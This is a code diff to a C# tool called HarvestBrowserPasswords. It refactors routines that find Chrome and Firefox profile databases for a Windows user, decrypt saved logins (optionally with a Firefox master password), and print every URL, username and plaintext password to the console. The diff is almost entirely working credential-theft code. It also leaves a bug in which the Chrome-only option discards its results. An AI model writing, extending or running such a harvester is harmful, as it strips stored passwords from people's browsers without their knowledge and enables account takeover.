@@ -10,7 +10,7 @@ using CommandLine;
 namespace HarvestBrowserPasswords
 {
     class Program
-    { 
+    {
         static void Main(string[] args)
         {
             //Get username of current user account
@@ -22,27 +22,31 @@ namespace HarvestBrowserPasswords
                 .WithParsed(parsed => opts = parsed);
             //.WithNotParsed(errors => Console.WriteLine($"Not parsed: {errors}"));
 
-            List<BrowserLoginData> LoginDataList = new List<BrowserLoginData>();
+            List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();
 
             if (opts.All)
             {
-                GetChromePasswords(userAccountName, LoginDataList);
-                GetFirefoxPasswords(userAccountName, LoginDataList);
+                loginDataList = (loginDataList.Concat(GetChromePasswords(userAccountName))).ToList();
+                loginDataList = (loginDataList.Concat(GetFirefoxPasswords(userAccountName, opts.Password))).ToList();
             }
             else if (opts.Chrome)
             {
-                GetChromePasswords(userAccountName, LoginDataList);
+                GetChromePasswords(userAccountName);
             }
             else if (opts.Firefox)
             {
-                if (opts.Password.Equals(""))
-                {
-                    GetFirefoxPasswords(userAccountName, LoginDataList);
-                }
-                else
-                {
-                    GetFirefoxPasswords(userAccountName, opts.Password, LoginDataList);
-                }
+                loginDataList = (loginDataList.Concat(GetFirefoxPasswords(userAccountName, opts.Password))).ToList();
+            }
+
+            if (string.IsNullOrEmpty(opts.Outfile))
+            {
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                PrintLoginsToConsole(loginDataList);
+            }
+            else
+            {
+                //Write to CSV
+                //WriteToCsv(LoginDataList, opts.Outfile);
             }
         }
 
@@ -54,9 +58,11 @@ namespace HarvestBrowserPasswords
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
       
-        public static void GetChromePasswords(string userAccountName, List<BrowserLoginData> loginDataList)
+        public static List<BrowserLoginData> GetChromePasswords(string userAccountName)
         {
             List<string> chromeProfiles = FindChromeProfiles(userAccountName);
+
+            List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();
 
             foreach (string chromeProfile in chromeProfiles)
             {
@@ -67,16 +73,11 @@ namespace HarvestBrowserPasswords
                     Console.WriteLine($"[+] Found Chrome credential database for user: {userAccountName}");
                     ChromeDatabaseDecryptor decryptor = new ChromeDatabaseDecryptor(loginDataFile);
 
-                    BrowserLoginData loginData = new BrowserLoginData(
-                        decryptor.FormSubmitUrl,
-                        decryptor.Username,
-                        decryptor.Password,
-                        "Chrome"
-                        );
-
-                    loginDataList.Add(loginData);
+                    loginDataList = (loginDataList.Concat(decryptor.ChromeLoginDataList)).ToList();
                 }
             }
+
+            return loginDataList;
         }
 
         public static List<string> FindChromeProfiles(string userAccountName)
@@ -103,45 +104,24 @@ namespace HarvestBrowserPasswords
                     }
                 }
             }
+
             return profileDirectories;
         }
 
-        public static void GetFirefoxPasswords(string userAccountName, List<BrowserLoginData> loginDataList)
-        {
-            string masterPassword = "";
-
-            foreach (string profile in FindFirefoxProfiles(userAccountName))
-            {
-                FirefoxDatabaseDecryptor decryptor = new FirefoxDatabaseDecryptor(profile, masterPassword);
-
-                BrowserLoginData loginData = new BrowserLoginData(
-                        decryptor.FormSubmitUrl,
-                        decryptor.Username,
-                        decryptor.Password,
-                        "Firefox"
-                        );
-
-                loginDataList.Add(loginData);
-            }
-        }
-
-        //TODO: Fuck this overload off and do both password cases in one method
         //Overload for case where master password is set
-        public static void GetFirefoxPasswords(string userAccountName, string masterPassword, List<BrowserLoginData> loginDataList)
+        public static List<BrowserLoginData> GetFirefoxPasswords(string userAccountName, string masterPassword)
         {
+            List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();
+
             foreach (string profile in FindFirefoxProfiles(userAccountName))
             {
                 FirefoxDatabaseDecryptor decryptor = new FirefoxDatabaseDecryptor(profile, masterPassword);
 
-                BrowserLoginData loginData = new BrowserLoginData(
-                        decryptor.FormSubmitUrl,
-                        decryptor.Username,
-                        decryptor.Password,
-                        "Firefox"
-                        );
-
-                loginDataList.Add(loginData);
+                //Take the list of logins from this decryptor and add them to the total list of logins
+                loginDataList = (loginDataList.Concat(decryptor.FirefoxLoginDataList)).ToList();
             }
+
+            return loginDataList;
         }
 
         public static List<string> FindFirefoxProfiles(string userAccountName)
@@ -183,6 +163,26 @@ namespace HarvestBrowserPasswords
             Console.ResetColor();
 
             return userAccountName;
+        }
+
+        private static void PrintLoginsToConsole(List<BrowserLoginData> loginDataList)
+        {
+
+            string line = new String('=', 60);
+
+            Console.ForegroundColor = ConsoleColor.Yellow;
+
+            foreach (BrowserLoginData loginData in loginDataList)
+            {
+                Console.WriteLine(line);
+                Console.WriteLine($"URL              {loginData.FormSubmitUrl}");
+                Console.WriteLine($"Username         {loginData.Username}");
+                Console.WriteLine($"Password         {loginData.Password}");
+                Console.WriteLine($"Browser          {loginData.Browser}");
+            }
+
+            Console.WriteLine(line);
+            Console.ResetColor();
         }
     }  
 }
